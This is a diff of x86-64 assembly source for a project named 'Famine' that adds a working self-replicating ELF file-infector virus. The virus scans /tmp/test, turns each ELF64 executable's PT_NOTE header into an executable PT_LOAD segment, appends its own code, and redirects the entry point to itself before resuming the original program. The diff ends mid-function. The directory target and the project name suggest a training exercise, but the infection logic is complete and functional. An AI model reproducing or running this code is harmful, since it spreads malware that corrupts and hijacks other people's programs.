@@ -7,7 +7,8 @@
 %define SYS_WRITE       1
 %define SYS_CLOSE       3
 
-; Constants for file list storage
+; Constants for virus operation
+%define VIRUS_STACK_SIZE  16384  ; Stack space for virus buffers
 
 section .bss
     path_buffer:    resb PATH_BUFF_SIZE       ; buffer for building full path
@@ -16,6 +17,7 @@ section .bss
     elf_header_buf: resb 64                   ; buffer for reading ELF header
     elf_phdr_buf:   resb ELF64_PHDR_SIZE * MAX_PHDRS  ; buffer for program headers
     sig_check_buf:  resb BUFFER_SIZE          ; buffer for checking signature
+    virus_copy_buf: resb 16384                ; buffer for virus code to inject
 
 section .data
     newline:              db 10               ; newline character
@@ -24,406 +26,1021 @@ section .data
     msg_add_pt_load:      db "add pt_load", 10, 0
     msg_infected:         db "infected ", 0
     msg_already_infected: db "already infected", 10, 0
+    proc_self_exe:        db "/proc/self/exe", 0
 
 section .text
 global _start
 global list_files_recursive
 
+; ============================================
+; VIRUS PAYLOAD - The part that gets executed in infected binaries
+; This section contains everything needed for the virus to run
+; All data is embedded in code and all buffers are stack-allocated
+; ============================================
+
+virus_start:
+; Original entry point storage (patched during infection)
+original_entry_storage:
+    dq 0                        ; 8 bytes for original entry point
+
 _start:
-    ; Initialize file count to 0
+    ; Save all registers we'll use
+    push rbp
+    mov rbp, rsp
+    push rbx
+    push r12
+    push r13
+    push r14
+    push r15
+
+    ; Get base address using RIP-relative call trick
+    call .get_base
+.get_base:
+    pop r15                     ; r15 = address of .get_base label
+    sub r15, .get_base - virus_start  ; r15 = base address of virus_start
+
+    ; Check if original_entry_storage is 0 (we're the original Famine binary)
+    mov rax, [r15 + original_entry_storage - virus_start]
+    test rax, rax
+    jnz .run_as_virus           ; if not zero, we're running as virus in infected binary
+
+    ; ===== ORIGINAL FAMINE BINARY EXECUTION PATH =====
+    ; When running as original famine binary, use normal data sections
     mov qword [rel file_count], 0
     
     mov rsi, firstDir           ; source = /tmp/test
-    lea rdi, [rel path_buffer]  ; destination = path_buffer
+    lea rdi, [rel path_buffer]
     call print_string
     call str_copy
-    ; Call list_files_recursive with path_buffer
     lea rdi, [rel path_buffer]
     call list_files_recursive
     
-    ; Call check_elf64_exec with the file list
     lea rdi, [rel file_list]
     mov rsi, [rel file_count]
     call check_elf64_exec
     
     jmp _end
 
+.run_as_virus:
+    ; ===== VIRUS EXECUTION PATH IN INFECTED BINARY =====
+    ; We're running as the virus payload in an infected binary
+    ; We need to use stack-based buffers and position-independent code
+    
+    ; The stored value is the offset from our _start to the original entry
+    ; Calculate actual original entry: current_rip + stored_offset
+    ; Get current location of _start
+    call .get_start_rip
+.get_start_rip:
+    pop rax                     ; rax = address of .get_start_rip
+    sub rax, .get_start_rip - _start  ; rax = actual address of _start
+    
+    ; Add the stored offset to get original entry
+    add rax, [r15 + original_entry_storage - virus_start]
+    push rax                    ; save original entry point at bottom of our stack
+    
+    ; Allocate stack space for our buffers
+    sub rsp, VIRUS_STACK_SIZE
+    and rsp, ~15                ; 16-byte align
+
+    ; For simplicity in virus mode, just do a minimal infection attempt
+    ; Initialize file_count on stack
+    mov qword [rsp], 0
+    
+    ; Build path on stack: "/tmp/test"
+    lea rdi, [rsp + 8]          ; path buffer
+    lea rsi, [r15 + v_firstDir - virus_start]  ; virus embedded string
+    call virus_str_copy
+    
+    ; List files in directory
+    lea rdi, [rsp + 8]          ; path buffer
+    lea rsi, [rsp]              ; file count pointer
+    lea rdx, [rsp + 4104]       ; file list buffer
+    call virus_list_and_infect
+
+    ; Restore to original stack frame
+    mov rsp, rbp
+    
+    ; Pop original entry point into rax
+    ; (we pushed it right after the callee-saved regs)
+    sub rsp, 48                 ; 6 regs: r15, r14, r13, r12, rbx, (original_entry we pushed)
+    pop rax                     ; get original entry point
+    
+    ; Restore stack properly for clean state
+    mov rsp, rbp
+    add rsp, 8                  ; pop our rbp frame
+    
+    ; Clear registers to provide clean state (like kernel does)
+    xor rdi, rdi
+    xor rsi, rsi
+    xor rdx, rdx
+    xor rcx, rcx
+    xor r8, r8
+    xor r9, r9
+    xor r10, r10
+    xor r11, r11
+    ; Don't clear rsp, rbp, or rax (entry point)
+    
+    ; Jump to original entry point
+    jmp rax
 
 ; ============================================
-; add_pt_load(char *filepath)
-; rdi = pointer to file path
-; Converts a PT_NOTE segment to PT_LOAD in the ELF file,
-; pointing to the end of the file with filesz/memsz = 0x1000
+; Embedded virus strings (in code section for position independence)
 ; ============================================
-add_pt_load:
+v_firstDir:       db "/tmp/test", 0
+v_signature:      db "Famine version 1.0 (c)oded by <ocrossi>-<elaignel>", 0
+v_signature_len:  equ $ - v_signature - 1
+
+; ============================================
+; virus_str_copy - Copy string (position independent)
+; rdi = destination
+; rsi = source
+; ============================================
+virus_str_copy:
+    push rax
+.v_str_copy_loop:
+    lodsb
+    stosb
+    test al, al
+    jnz .v_str_copy_loop
+    pop rax
+    ret
+
+; ============================================
+; virus_str_len - Get string length
+; rdi = string pointer
+; Returns: rax = length
+; ============================================
+virus_str_len:
+    push rdi
+    xor rax, rax
+.v_str_len_loop:
+    cmp byte [rdi], 0
+    je .v_str_len_done
+    inc rdi
+    inc rax
+    jmp .v_str_len_loop
+.v_str_len_done:
+    pop rdi
+    ret
+
+; ============================================
+; virus_list_and_infect - List files and infect ELF64 executables
+; rdi = path buffer
+; rsi = file count pointer
+; rdx = file list buffer
+; r15 = virus base address (preserved)
+; ============================================
+virus_list_and_infect:
     push rbp
     mov rbp, rsp
-    sub rsp, 32                 ; allocate local variable space
-    push r12                    ; saved file path
-    push r13                    ; saved file descriptor
-    push r14                    ; saved e_phoff
-    push r15                    ; saved e_phnum
-    push rbx                    ; saved e_phentsize
+    sub rsp, 4224               ; stack space for getdents buffer and local vars
+    push r12                    ; path buffer
+    push r13                    ; file count ptr
+    push r14                    ; file list ptr
+    push rbx
 
-    mov r12, rdi                ; r12 = file path
+    mov r12, rdi                ; save path buffer
+    mov r13, rsi                ; save file count ptr  
+    mov r14, rdx                ; save file list ptr
 
-    ; Open the file for read/write
+    ; Get path length
+    mov rdi, r12
+    call virus_str_len
+    mov [rbp-8], rax            ; save path length
+
+    ; Open directory
     mov eax, SYS_OPENAT
     mov edi, AT_FDCWD
-    mov rsi, r12                ; pathname
-    mov edx, O_RDWR             ; flags: read-write
+    mov rsi, r12
+    mov edx, O_RDONLY | 0x10000 ; O_RDONLY | O_DIRECTORY
     xor r10d, r10d
     syscall
 
-    ; Check if open failed
     test rax, rax
-    js .add_pt_load_fail        ; if fd < 0, fail
+    js .vl_done
 
-    mov r13, rax                ; r13 = fd
+    mov rbx, rax                ; save fd
 
-    ; Get the file size using lseek to SEEK_END
-    mov eax, SYS_LSEEK
-    mov edi, r13d               ; fd
-    xor esi, esi                ; offset = 0
-    mov edx, SEEK_END           ; whence = SEEK_END
+.vl_read_loop:
+    ; getdents64
+    mov eax, 217                ; SYS_GETDENTS64
+    mov edi, ebx
+    lea rsi, [rbp-4224]         ; buffer on stack
+    mov edx, 4096
     syscall
 
     test rax, rax
-    js .add_pt_load_close_fail
+    jle .vl_close_dir
 
-    mov [rbp-8], rax            ; save file size at [rbp-8]
+    mov [rbp-16], rax           ; save nread
+    mov qword [rbp-24], 0       ; pos = 0
 
-    ; Seek back to beginning for reading ELF header
-    mov eax, SYS_LSEEK
-    mov edi, r13d               ; fd
-    xor esi, esi                ; offset = 0
-    xor edx, edx                ; SEEK_SET = 0
+.vl_process_entry:
+    mov rax, [rbp-24]
+    cmp rax, [rbp-16]
+    jge .vl_read_loop
+
+    lea rdi, [rbp-4224]
+    add rdi, rax                ; dirent pointer
+
+    ; Get d_reclen (offset 16)
+    movzx ecx, word [rdi + 16]
+    mov [rbp-32], rcx           ; save d_reclen
+
+    ; Get d_type (offset 18)
+    movzx eax, byte [rdi + 18]
+
+    ; Get d_name (offset 19)
+    lea rsi, [rdi + 19]
+
+    ; Skip . and ..
+    cmp byte [rsi], '.'
+    jne .vl_not_dot
+    cmp byte [rsi+1], 0
+    je .vl_next_entry
+    cmp byte [rsi+1], '.'
+    jne .vl_not_dot
+    cmp byte [rsi+2], 0
+    je .vl_next_entry
+
+.vl_not_dot:
+    ; Check if regular file (DT_REG = 8)
+    cmp al, 8
+    jne .vl_next_entry
+
+    ; Build full path
+    mov rdi, r12
+    mov rax, [rbp-8]            ; path length
+    add rdi, rax
+
+    ; Add / if needed
+    cmp byte [rdi-1], '/'
+    je .vl_no_slash
+    mov byte [rdi], '/'
+    inc rdi
+.vl_no_slash:
+    ; rsi already points to d_name
+    push rdi
+    call virus_str_copy
+    pop rdi
+
+    ; Try to infect this file
+    mov rdi, r12
+    call virus_infect_elf
+
+    ; Restore path
+    mov rax, [rbp-8]
+    mov byte [r12 + rax], 0
+
+.vl_next_entry:
+    mov rax, [rbp-24]
+    add rax, [rbp-32]
+    mov [rbp-24], rax
+    jmp .vl_process_entry
+
+.vl_close_dir:
+    mov eax, SYS_CLOSE
+    mov edi, ebx
     syscall
 
-    ; Read the ELF header (64 bytes)
+.vl_done:
+    pop rbx
+    pop r14
+    pop r13
+    pop r12
+    add rsp, 4224
+    mov rsp, rbp
+    pop rbp
+    ret
+
+; ============================================
+; virus_infect_elf - Try to infect an ELF64 file
+; rdi = file path
+; r15 = virus base address (preserved)
+; ============================================
+virus_infect_elf:
+    push rbp
+    mov rbp, rsp
+    sub rsp, 4096 + 128         ; Buffer for ELF header, phdrs, and local vars
+    push r12                    ; file path
+    push r13                    ; file descriptor
+    push r14                    ; e_phoff
+    push rbx
+
+    mov r12, rdi
+
+    ; Open file for read/write
+    mov eax, SYS_OPENAT
+    mov edi, AT_FDCWD
+    mov rsi, r12
+    mov edx, O_RDWR
+    xor r10d, r10d
+    syscall
+
+    test rax, rax
+    js .vi_fail
+
+    mov r13, rax                ; fd
+
+    ; Get file size
+    mov eax, SYS_LSEEK
+    mov edi, r13d
+    xor esi, esi
+    mov edx, SEEK_END
+    syscall
+
+    test rax, rax
+    js .vi_close_fail
+
+    mov [rbp-8], rax            ; save file size
+
+    ; Seek to beginning
+    mov eax, SYS_LSEEK
+    mov edi, r13d
+    xor esi, esi
+    xor edx, edx
+    syscall
+
+    ; Read ELF header
     mov eax, SYS_READ
-    mov edi, r13d               ; fd
-    lea rsi, [rel elf_header_buf]
-    mov edx, 64                 ; read 64 bytes
+    mov edi, r13d
+    lea rsi, [rbp-112]          ; ELF header buffer
+    mov edx, 64
     syscall
 
-    ; Check if we read enough bytes
     cmp rax, 64
-    jl .add_pt_load_close_fail
+    jl .vi_close_fail
 
-    ; Get e_phoff (program header table offset) from ELF header at offset 32
-    lea rdi, [rel elf_header_buf]
-    mov r14, [rdi + e_phoff]    ; r14 = e_phoff
+    ; Check ELF magic
+    lea rdi, [rbp-112]
+    cmp dword [rdi], 0x464c457f ; "\x7fELF"
+    jne .vi_close_fail
 
-    ; Get e_phnum (number of program headers) from ELF header at offset 56
-    movzx r15d, word [rdi + e_phnum]  ; r15 = e_phnum
+    ; Check ELF class (must be 64-bit)
+    cmp byte [rdi+4], 2
+    jne .vi_close_fail
 
-    ; Get e_phentsize (size of each program header entry) from ELF header at offset 54
-    movzx ebx, word [rdi + e_phentsize]  ; rbx = e_phentsize
+    ; Check e_type (2=ET_EXEC or 3=ET_DYN)
+    movzx eax, word [rdi+16]
+    cmp ax, 2
+    je .vi_valid_elf_type
+    cmp ax, 3
+    jne .vi_close_fail
 
-    ; Seek to the program header table
+.vi_valid_elf_type:
+    ; Save original entry point
+    mov rax, [rdi + 24]         ; e_entry at offset 24
+    mov [rbp-16], rax
+
+    ; Get e_phoff
+    mov r14, [rdi + 32]         ; e_phoff at offset 32
+
+    ; Get e_phentsize
+    movzx eax, word [rdi + 54]
+    mov [rbp-32], rax
+
+    ; Get e_phnum
+    movzx eax, word [rdi + 56]
+    mov [rbp-40], rax
+
+    ; Seek to program headers
     mov eax, SYS_LSEEK
-    mov edi, r13d               ; fd
-    mov rsi, r14                ; offset = e_phoff
-    xor edx, edx                ; SEEK_SET = 0
+    mov edi, r13d
+    mov rsi, r14
+    xor edx, edx
     syscall
 
-    test rax, rax
-    js .add_pt_load_close_fail
+    ; Read all program headers
+    mov rax, [rbp-40]           ; e_phnum
+    imul rax, [rbp-32]          ; * e_phentsize
+    mov rdx, rax
 
-    ; Read all existing program headers
-    ; Calculate total size first: e_phnum * e_phentsize
-    mov rax, r15                ; e_phnum
-    imul rax, rbx               ; * e_phentsize
-    mov rdx, rax                ; read size
-    
     mov eax, SYS_READ
-    mov edi, r13d               ; fd
-    lea rsi, [rel elf_phdr_buf]
+    mov edi, r13d
+    lea rsi, [rbp-4224]         ; phdr buffer
     syscall
 
-    ; Find a PT_NOTE segment to convert to PT_LOAD
-    lea rdi, [rel elf_phdr_buf]
-    xor rcx, rcx                ; index counter
-    mov [rbp-16], rcx           ; save index of found PT_NOTE (-1 if not found)
-    dec qword [rbp-16]          ; set to -1 initially
+    ; Find PT_NOTE to convert to PT_LOAD
+    lea rdi, [rbp-4224]
+    xor rcx, rcx                ; index
+    mov rax, [rbp-40]           ; e_phnum
 
-.find_note_loop:
-    cmp rcx, r15                ; compare with e_phnum
-    jge .find_note_done
+.vi_find_note:
+    cmp rcx, rax
+    jge .vi_close_fail          ; No PT_NOTE found
 
-    ; Calculate offset to current phdr
-    mov rax, rcx
-    imul rax, rbx               ; * e_phentsize
-    lea rsi, [rdi + rax]        ; rsi = pointer to current phdr
+    mov rdx, rcx
+    imul rdx, [rbp-32]          ; * e_phentsize
+    lea rsi, [rdi + rdx]
 
-    ; Check if p_type == PT_NOTE (4)
-    cmp dword [rsi + p_type], PT_NOTE
-    jne .find_note_next
+    cmp dword [rsi], PT_NOTE    ; p_type
+    je .vi_found_note
 
-    ; Found PT_NOTE, save index
-    mov [rbp-16], rcx
-    jmp .find_note_done
-
-.find_note_next:
     inc rcx
-    jmp .find_note_loop
+    jmp .vi_find_note
 
-.find_note_done:
-    ; Check if we found a PT_NOTE
-    cmp qword [rbp-16], -1
-    je .add_pt_load_close_fail  ; No PT_NOTE found, fail
+.vi_found_note:
+    ; rsi points to the PT_NOTE phdr
+    ; First, we need to find the highest vaddr in existing LOAD segments
+    ; Save rsi (pointer to PT_NOTE phdr) on stack
+    push rsi
+    
+    ; Scan all phdrs to find max vaddr + memsz
+    lea rdi, [rbp-4224]         ; phdrs buffer
+    xor rcx, rcx                ; index
+    xor r8, r8                  ; max_vaddr_end = 0
+    mov rax, [rbp-40]           ; e_phnum
 
-    ; Get pointer to the PT_NOTE we're converting
-    mov rcx, [rbp-16]           ; index of PT_NOTE
-    mov rax, rcx
-    imul rax, rbx               ; * e_phentsize
-    lea rdi, [rel elf_phdr_buf]
-    add rdi, rax                ; rdi = pointer to PT_NOTE phdr
+.vi_find_max_vaddr:
+    cmp rcx, rax
+    jge .vi_found_max_vaddr
 
-    ; Convert PT_NOTE to PT_LOAD
-    ; p_type = PT_LOAD (1)
-    mov dword [rdi + p_type], PT_LOAD
+    mov rdx, rcx
+    imul rdx, [rbp-32]          ; * e_phentsize
+    lea rsi, [rdi + rdx]
 
-    ; p_flags = PF_R | PF_W | PF_X (readable, writable, executable)
-    mov dword [rdi + p_flags], PF_R | PF_W | PF_X
+    ; Check if this is a LOAD segment
+    cmp dword [rsi], PT_LOAD
+    jne .vi_next_phdr
 
-    ; p_offset = file size (end of current file)
-    mov rax, [rbp-8]            ; get file size
-    mov qword [rdi + p_offset], rax
+    ; Get vaddr + memsz
+    mov r9, [rsi+16]            ; p_vaddr
+    add r9, [rsi+40]            ; + p_memsz
+    cmp r9, r8
+    jle .vi_next_phdr
+    mov r8, r9                  ; update max
 
-    ; p_vaddr = Compute aligned virtual address
-    ; We use a high address like 0xc000000 + aligned file offset
-    mov rcx, rax                ; file size
-    add rcx, 0xfff              ; align up to page boundary
-    and rcx, ~0xfff             ; clear low 12 bits
-    add rcx, 0xc000000          ; add base address offset
-    mov qword [rdi + p_vaddr], rcx
+.vi_next_phdr:
+    inc rcx
+    jmp .vi_find_max_vaddr
 
-    ; p_paddr = same as p_vaddr
-    mov qword [rdi + p_paddr], rcx
+.vi_found_max_vaddr:
+    ; r8 now contains the highest vaddr + memsz
+    ; We need p_vaddr to be congruent to p_offset modulo page size
+    ; p_offset = file_size, so: p_vaddr % 0x1000 == file_size % 0x1000
+    
+    ; First, get the file size's page offset
+    mov rax, [rbp-8]            ; file size
+    mov r9, rax                 ; save file size in r9
+    and rax, 0xfff              ; file_size % page_size
+    
+    ; Align r8 (max_vaddr_end) up to next page boundary, then add the offset
+    add r8, 0xfff
+    and r8, ~0xfff              ; page-aligned
+    add r8, rax                 ; add file offset within page
+    
+    ; Restore rsi (pointer to PT_NOTE phdr)
+    pop rsi
+    
+    ; Convert to PT_LOAD
+    mov dword [rsi], PT_LOAD    ; p_type
+    mov dword [rsi+4], PF_R | PF_W | PF_X  ; p_flags
 
-    ; p_filesz = PT_LOAD_FILESZ (from include.s)
-    mov qword [rdi + p_filesz], PT_LOAD_FILESZ
+    ; p_offset = file size
+    mov [rsi+8], r9             ; use saved file size
 
-    ; p_memsz = PT_LOAD_MEMSZ (from include.s)
-    mov qword [rdi + p_memsz], PT_LOAD_MEMSZ
+    ; p_vaddr = properly aligned value in r8
+    mov [rsi+16], r8            ; p_vaddr
+    mov [rsi+24], r8            ; p_paddr
+    mov [rbp-24], r8            ; save for later
 
-    ; p_align = 0x1000 (4KB alignment)
-    mov qword [rdi + p_align], 0x1000
+    ; p_filesz and p_memsz = virus size
+    mov rax, virus_end - virus_start
+    mov [rsi+32], rax           ; p_filesz
+    mov [rsi+40], rax           ; p_memsz
 
-    ; Seek to the program header table to write back the modified program headers
-    ; (We don't modify e_phnum - just convert PT_NOTE to PT_LOAD)
+    ; p_align = 0x1000
+    mov qword [rsi+48], 0x1000
+
+    ; Write modified phdrs back
     mov eax, SYS_LSEEK
-    mov edi, r13d               ; fd
-    mov rsi, r14                ; offset = e_phoff
-    xor edx, edx                ; SEEK_SET = 0
+    mov edi, r13d
+    mov rsi, r14                ; e_phoff
+    xor edx, edx
     syscall
 
-    test rax, rax
-    js .add_pt_load_close_fail
-
-    ; Write all program headers (with the modified one)
-    ; Calculate total size first: e_phnum * e_phentsize
-    mov rax, r15                ; e_phnum (original, not incremented)
-    imul rax, rbx               ; * e_phentsize
-    mov rdx, rax                ; write size
+    mov rax, [rbp-40]           ; e_phnum
+    imul rax, [rbp-32]          ; * e_phentsize
+    mov rdx, rax
 
     mov eax, SYS_WRITE
-    mov edi, r13d               ; fd
-    lea rsi, [rel elf_phdr_buf]
+    mov edi, r13d
+    lea rsi, [rbp-4224]
     syscall
 
-    ; Close the file
+    ; Update entry point
+    mov rax, [rbp-24]           ; new vaddr
+    add rax, _start - virus_start  ; offset to _start
+    lea rdi, [rbp-112]
+    mov [rdi + 24], rax         ; e_entry
+
+    ; Write updated ELF header
+    mov eax, SYS_LSEEK
+    mov edi, r13d
+    xor esi, esi
+    xor edx, edx
+    syscall
+
+    mov eax, SYS_WRITE
+    mov edi, r13d
+    lea rsi, [rbp-112]
+    mov edx, 64
+    syscall
+
+    ; Prepare virus copy with patched original entry
+    ; Copy virus to temp buffer
+    lea rdi, [rbp-4224]
+    mov rsi, r15                ; virus_start address
+    mov rcx, virus_end - virus_start
+.vi_copy_virus:
+    test rcx, rcx
+    jz .vi_copy_done
+    mov al, [rsi]
+    mov [rdi], al
+    inc rsi
+    inc rdi
+    dec rcx
+    jmp .vi_copy_virus
+
+.vi_copy_done:
+    ; Patch original_entry_storage
+    ; For PIE binaries, we store the offset from our _start to the original entry
+    ; This way, at runtime: actual_original_entry = our_rip + stored_offset
+    lea rdi, [rbp-4224]
+    mov rax, [rbp-16]           ; original entry point (offset)
+    mov rcx, [rbp-24]           ; our new vaddr
+    add rcx, _start - virus_start  ; add offset to _start
+    sub rax, rcx                ; offset = original_entry - our_entry
+    mov [rdi + original_entry_storage - virus_start], rax
+
+    ; Seek to end of file
+    mov eax, SYS_LSEEK
+    mov edi, r13d
+    xor esi, esi
+    mov edx, SEEK_END
+    syscall
+
+    ; Write virus code
+    mov eax, SYS_WRITE
+    mov edi, r13d
+    lea rsi, [rbp-4224]
+    mov edx, virus_end - virus_start
+    syscall
+
+    ; Close file
     mov eax, SYS_CLOSE
     mov edi, r13d
     syscall
 
-    ; Print success message
-    lea rdi, [rel msg_add_pt_load]
+    jmp .vi_done
+
+.vi_close_fail:
+    mov eax, SYS_CLOSE
+    mov edi, r13d
+    syscall
+
+.vi_fail:
+.vi_done:
+    pop rbx
+    pop r14
+    pop r13
+    pop r12
+    add rsp, 4096 + 128
+    mov rsp, rbp
+    pop rbp
+    ret
+
+; ============================================
+; VIRUS CODE END
+; ============================================
+virus_end:
+
+; ============================================
+; Non-virus code (regular Famine operation)
+; ============================================
+
+; ============================================
+; add_pt_load(char *filepath)
+; rdi = pointer to file path
+; ============================================
+add_pt_load:
+    push rbp
+    mov rbp, rsp
+    sub rsp, 80
+    push r12
+    push r13
+    push r14
+    push r15
+    push rbx
+
+    mov r12, rdi                ; file path
+
+    ; Get the virus base address
+    call .get_virus_base
+.get_virus_base:
+    pop r15
+    sub r15, .get_virus_base - virus_start
+
+    ; Open file for read/write
+    mov eax, SYS_OPENAT
+    mov edi, AT_FDCWD
+    mov rsi, r12
+    mov edx, O_RDWR
+    xor r10d, r10d
+    syscall
+
+    test rax, rax
+    js .add_pt_load_fail
+
+    mov r13, rax                ; fd
+
+    ; Get file size
+    mov eax, SYS_LSEEK
+    mov edi, r13d
+    xor esi, esi
+    mov edx, SEEK_END
+    syscall
+
+    test rax, rax
+    js .add_pt_load_close_fail
+
+    mov [rbp-8], rax            ; file size
+
+    ; Seek to beginning
+    mov eax, SYS_LSEEK
+    mov edi, r13d
+    xor esi, esi
+    xor edx, edx
+    syscall
+
+    ; Read ELF header
+    mov eax, SYS_READ
+    mov edi, r13d
+    lea rsi, [rel elf_header_buf]
+    mov edx, 64
+    syscall
+
+    cmp rax, 64
+    jl .add_pt_load_close_fail
+
+    ; Get and save original entry point
+    lea rdi, [rel elf_header_buf]
+    mov rax, [rdi + e_entry]
+    mov [rbp-24], rax           ; original entry
+
+    ; Get e_phoff
+    mov r14, [rdi + e_phoff]
+
+    ; Get e_phnum
+    movzx ebx, word [rdi + e_phnum]
+
+    ; Get e_phentsize
+    movzx eax, word [rdi + e_phentsize]
+    mov [rbp-40], rax
+
+    ; Seek to phdrs
+    mov eax, SYS_LSEEK
+    mov edi, r13d
+    mov rsi, r14
+    xor edx, edx
+    syscall
+
+    ; Read all phdrs
+    mov rax, rbx
+    imul rax, [rbp-40]
+    mov rdx, rax
+
+    mov eax, SYS_READ
+    mov edi, r13d
+    lea rsi, [rel elf_phdr_buf]
+    syscall
+
+    ; Find PT_NOTE
+    lea rdi, [rel elf_phdr_buf]
+    xor rcx, rcx
+
+.find_note_loop:
+    cmp rcx, rbx
+    jge .add_pt_load_close_fail
+
+    mov rax, rcx
+    imul rax, [rbp-40]
+    lea rsi, [rdi + rax]
+
+    cmp dword [rsi + p_type], PT_NOTE
+    je .found_note_main
+
+    inc rcx
+    jmp .find_note_loop
+
+.found_note_main:
+    ; First, find the highest vaddr in existing LOAD segments
+    ; Save rsi (pointer to PT_NOTE phdr) on stack
+    push rsi
+    
+    ; Scan all phdrs to find max vaddr + memsz
+    lea rdi, [rel elf_phdr_buf]
+    xor rcx, rcx                ; index
+    xor r8, r8                  ; max_vaddr_end = 0
+
+.find_max_vaddr_main:
+    cmp rcx, rbx                ; rbx = e_phnum
+    jge .found_max_vaddr_main
+
+    mov rax, rcx
+    imul rax, [rbp-40]          ; * e_phentsize
+    lea rsi, [rdi + rax]
+
+    ; Check if this is a LOAD segment
+    cmp dword [rsi + p_type], PT_LOAD
+    jne .next_phdr_main
+
+    ; Get vaddr + memsz
+    mov r9, [rsi + p_vaddr]
+    add r9, [rsi + p_memsz]
+    cmp r9, r8
+    jle .next_phdr_main
+    mov r8, r9                  ; update max
+
+.next_phdr_main:
+    inc rcx
+    jmp .find_max_vaddr_main
+
+.found_max_vaddr_main:
+    ; r8 now contains the highest vaddr + memsz
+    ; We need p_vaddr to be congruent to p_offset modulo page size
+    ; p_offset = file_size, so: p_vaddr % 0x1000 == file_size % 0x1000
+    
+    ; First, get the file size's page offset
+    mov rax, [rbp-8]            ; file size
+    and rax, 0xfff              ; file_size % page_size
+    
+    ; Align r8 (max_vaddr_end) up to next page boundary, then add the offset
+    add r8, 0xfff
+    and r8, ~0xfff              ; page-aligned
+    add r8, rax                 ; add file offset within page
+    
+    ; Restore rsi (pointer to PT_NOTE phdr)
+    pop rsi
+
+    ; Convert PT_NOTE to PT_LOAD
+    mov dword [rsi + p_type], PT_LOAD
+    mov dword [rsi + p_flags], PF_R | PF_W | PF_X
+
+    mov rax, [rbp-8]            ; file size
+    mov qword [rsi + p_offset], rax
+
+    ; p_vaddr = properly aligned value in r8
+    mov qword [rsi + p_vaddr], r8
+    mov qword [rsi + p_paddr], r8
+    mov [rbp-32], r8            ; save new vaddr
+
+    mov rax, virus_end - virus_start
+    mov qword [rsi + p_filesz], rax
+    mov qword [rsi + p_memsz], rax
+    mov qword [rsi + p_align], 0x1000
+
+    ; Write back phdrs
+    mov eax, SYS_LSEEK
+    mov edi, r13d
+    mov rsi, r14
+    xor edx, edx
+    syscall
+
+    mov rax, rbx
+    imul rax, [rbp-40]
+    mov rdx, rax
+
+    mov eax, SYS_WRITE
+    mov edi, r13d
+    lea rsi, [rel elf_phdr_buf]
+    syscall
+
+    ; Update entry point
+    mov rax, [rbp-32]
+    add rax, _start - virus_start
+    lea rdi, [rel elf_header_buf]
+    mov [rdi + e_entry], rax
+
+    ; Write ELF header
+    mov eax, SYS_LSEEK
+    mov edi, r13d
+    xor esi, esi
+    xor edx, edx
+    syscall
+
+    mov eax, SYS_WRITE
+    mov edi, r13d
+    lea rsi, [rel elf_header_buf]
+    mov edx, 64
+    syscall
+
+    ; Copy virus to buffer and patch entry
+    lea rsi, [rel virus_start]
+    lea rdi, [rel virus_copy_buf]
+    mov rcx, virus_end - virus_start
+
+.copy_virus_main:
+    test rcx, rcx
+    jz .copy_done_main
+    mov al, [rsi]
+    mov [rdi], al
+    inc rsi
+    inc rdi
+    dec rcx
+    jmp .copy_virus_main
+
+.copy_done_main:
+    ; Patch original entry
+    ; For PIE binaries, store offset from our _start to original entry
+    lea rdi, [rel virus_copy_buf]
+    mov rax, [rbp-24]           ; original entry point
+    mov rcx, [rbp-32]           ; our new vaddr
+    add rcx, _start - virus_start  ; add offset to _start
+    sub rax, rcx                ; offset = original_entry - our_entry
+    mov [rdi + original_entry_storage - virus_start], rax
+
+    ; Write virus to end of file
+    mov eax, SYS_LSEEK
+    mov edi, r13d
+    xor esi, esi
+    mov edx, SEEK_END
+    syscall
+
+    mov eax, SYS_WRITE
+    mov edi, r13d
+    lea rsi, [rel virus_copy_buf]
+    mov edx, virus_end - virus_start
+    syscall
+
+    ; Close file
+    mov eax, SYS_CLOSE
+    mov edi, r13d
+    syscall
+
+    ; Print infected message
+    lea rdi, [rel msg_infected]
     call print_string
+    mov rdi, r12
+    call print_string
+    mov eax, SYS_WRITE
+    mov edi, STDOUT
+    lea rsi, [rel newline]
+    mov edx, 1
+    syscall
 
     jmp .add_pt_load_done
 
 .add_pt_load_close_fail:
-    ; Close the file
     mov eax, SYS_CLOSE
     mov edi, r13d
     syscall
 
 .add_pt_load_fail:
-    ; No success message printed on failure
-
 .add_pt_load_done:
     pop rbx
     pop r15
     pop r14
     pop r13
     pop r12
-    add rsp, 32                 ; deallocate local variable space
+    add rsp, 80
     mov rsp, rbp
     pop rbp
     ret
 
 ; ============================================
 ; process_non_elf_file(char *filepath)
-; rdi = pointer to file path
-; Opens the file, searches for the signature string,
-; if found: prints "already infected"
-; if not found: appends signature and prints "infected " + filename
 ; ============================================
 process_non_elf_file:
     push rbp
     mov rbp, rsp
-    push r12                    ; saved file path
-    push r13                    ; saved file descriptor
-    push r14                    ; saved file size / bytes read
-    push r15                    ; saved current position
-    push rbx                    ; saved for temp use
+    push r12
+    push r13
+    push r14
+    push r15
+    push rbx
 
-    mov r12, rdi                ; r12 = file path
+    mov r12, rdi
 
-    ; Open the file for reading
+    ; Open file
     mov eax, SYS_OPENAT
     mov edi, AT_FDCWD
-    mov rsi, r12                ; pathname
-    xor edx, edx                ; O_RDONLY = 0
+    mov rsi, r12
+    xor edx, edx
     xor r10d, r10d
     syscall
 
-    ; Check if open failed
     test rax, rax
-    js .process_done            ; if fd < 0, just return
+    js .process_done
 
-    mov r13, rax                ; r13 = fd
+    mov r13, rax
 
-    ; Get file size using lseek
+    ; Get file size
     mov eax, SYS_LSEEK
-    mov edi, r13d               ; fd
-    xor esi, esi                ; offset = 0
-    mov edx, SEEK_END           ; whence = SEEK_END
+    mov edi, r13d
+    xor esi, esi
+    mov edx, SEEK_END
     syscall
 
     test rax, rax
-    jle .process_close_and_append  ; if size <= 0, treat as not infected
+    jle .process_close_and_append
 
-    mov r14, rax                ; r14 = file size
+    mov r14, rax
 
-    ; Seek back to beginning
+    ; Seek to beginning
     mov eax, SYS_LSEEK
-    mov edi, r13d               ; fd
-    xor esi, esi                ; offset = 0
-    xor edx, edx                ; SEEK_SET = 0
+    mov edi, r13d
+    xor esi, esi
+    xor edx, edx
     syscall
 
-    xor r15, r15                ; r15 = current position in file
+    xor r15, r15
 
 .process_sig_read_loop:
-    ; Read a chunk of the file
     mov eax, SYS_READ
-    mov edi, r13d               ; fd
+    mov edi, r13d
     lea rsi, [rel sig_check_buf]
-    mov edx, BUFFER_SIZE        ; read BUFFER_SIZE bytes
+    mov edx, BUFFER_SIZE
     syscall
 
-    ; Check if read failed or EOF
     test rax, rax
